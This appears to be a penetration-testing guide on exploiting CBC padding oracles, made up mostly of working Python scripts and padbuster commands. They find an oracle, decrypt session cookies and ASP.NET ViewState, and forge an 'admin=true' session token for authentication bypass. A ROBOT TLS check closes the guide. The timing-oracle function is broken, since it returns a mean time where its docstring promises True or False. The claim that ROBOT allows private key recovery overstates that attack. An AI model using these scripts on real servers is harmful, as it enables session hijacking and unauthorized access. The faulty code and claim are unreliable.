# Padding oracle exploitation

A padding oracle is any server behaviour that reveals whether the PKCS#7 padding of a
decrypted CBC ciphertext is valid. This allows decryption of arbitrary ciphertext and,
with some oracles, encryption of arbitrary plaintext, enabling authentication bypass
and session forgery.

## Identifying the oracle

The oracle can manifest as:

- A different HTTP status code for valid versus invalid padding (200 vs 500)
- A different error message body ("Invalid padding" vs "User not found")
- A timing difference: the server takes longer when padding is valid because it
  proceeds to further processing before failing

Test by taking a known encrypted value from a cookie, parameter, or ViewState and
modifying the last byte of the second-to-last ciphertext block. Submit variations
and compare responses.

```python
import requests, time

base_url = 'https://target.example.com/app'
# capture encrypted value from traffic
enc_b64 = 'YOUR_ENCRYPTED_VALUE_HERE'

# flip the last byte of the penultimate block
# and look for response differences
import base64, binascii

ciphertext = base64.b64decode(enc_b64)
responses = {}
for byte_val in range(256):
    modified = bytearray(ciphertext)
    modified[-17] = byte_val  # last byte of block n-1 for 16-byte blocks
    modified_b64 = base64.b64encode(bytes(modified)).decode()
    r = requests.get(base_url, cookies={'session': modified_b64}, timeout=5)
    responses[byte_val] = (r.status_code, len(r.content))

# look for the outlier
statuses = set(v[0] for v in responses.values())
print(f'Status codes observed: {statuses}')
```

If you see a single different status code among 256 requests, you have a padding oracle.

## Automated exploitation with padbuster

Once confirmed, padbuster automates the byte-by-byte decryption:

```text
pip install padbuster

# decrypt an encrypted cookie value
padbuster https://target.example.com/app ENCRYPTED_VALUE 16 \
  --encoding 0 \
  --cookies "session=ENCRYPTED_VALUE"

# encoding options: 0=base64, 1=hex lower, 2=hex upper, 3=base64 URL-safe, 4=.NET UrlToken
```

The block size is almost always 16 (AES) or 8 (3DES or older DES). Try 16 first.

For ASP.NET ViewState (MAC disabled or bypassed), the target is the `__VIEWSTATE`
POST parameter:

```text
padbuster https://target.example.com/page.aspx \
  "$(curl -s https://target.example.com/page.aspx | grep -o '__VIEWSTATE[^"]*" value="[^"]*' | cut -d'"' -f4)" \
  16 --encoding 3
```

## Forging authenticated ciphertext

Some oracles allow encryption as well as decryption: by working backwards from a
desired plaintext, padbuster can produce valid ciphertext that decrypts correctly.
This enables authentication bypass by constructing a session token with arbitrary
content.

```text
# encrypt a plaintext value using the oracle
padbuster https://target.example.com/app ENCRYPTED_VALUE 16 \
  --encoding 0 \
  --plaintext "admin=true;user=administrator"
```

The resulting ciphertext, when set as the session cookie, decrypts to the forged
plaintext on the server.

## Manual exploitation (one block)

For a single 16-byte block, the manual approach shows the mechanics:

```python
# CBC padding oracle: decrypt the last block of a ciphertext
# given a two-block ciphertext: [IV/C0][C1]
# we want to find P1 = AES_decrypt(C1) XOR C0

import requests, base64

TARGET = 'https://target.example.com/app'
COOKIE_NAME = 'session'
BLOCK_SIZE = 16

def oracle(ciphertext_bytes):
    """Returns True if padding is valid."""
    enc = base64.b64encode(ciphertext_bytes).decode()
    r = requests.get(TARGET, cookies={COOKIE_NAME: enc}, timeout=5)
    return r.status_code == 200  # adjust based on observed oracle response

def decrypt_block(c0, c1):
    """Decrypt block c1 given preceding block c0."""
    intermediate = bytearray(BLOCK_SIZE)
    plaintext = bytearray(BLOCK_SIZE)

    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        pad_byte = BLOCK_SIZE - byte_pos
        # set already-known bytes to produce correct padding
        crafted_c0 = bytearray(BLOCK_SIZE)
        for k in range(byte_pos + 1, BLOCK_SIZE):
            crafted_c0[k] = intermediate[k] ^ pad_byte

        for guess in range(256):
            crafted_c0[byte_pos] = guess
            if oracle(bytes(crafted_c0) + c1):
                intermediate[byte_pos] = guess ^ pad_byte
                plaintext[byte_pos] = intermediate[byte_pos] ^ c0[byte_pos]
                break

    return bytes(plaintext)
```

## Timing oracle variant

If the response content and status are identical, measure response time:

```python
import statistics

def timing_oracle(ciphertext_bytes, samples=5):
    """Returns True if mean response time is above threshold (valid padding takes longer)."""
    enc = base64.b64encode(ciphertext_bytes).decode()
    times = []
    for _ in range(samples):
        import time
        start = time.monotonic()
        requests.get(TARGET, cookies={COOKIE_NAME: enc}, timeout=5)
        times.append(time.monotonic() - start)
    return statistics.mean(times)
```

Timing oracles require more requests per byte to achieve statistical confidence.
Run against a nearby host to reduce network jitter.

## ROBOT: PKCS#1 v1.5 RSA padding oracle

For TLS targets, the ROBOT check finds PKCS#1 v1.5 RSA padding oracles in the TLS
handshake. A positive result means the private key can be recovered or session keys
can be forged.

```text
git clone https://github.com/robotattackorg/robot-detect
cd robot-detect
python robot-detect.py target.example.com
```

ROBOT affects legacy TLS stacks; most modern servers have patched this. It is
most likely to appear on appliances, embedded TLS stacks, and older Java JSSE
configurations.
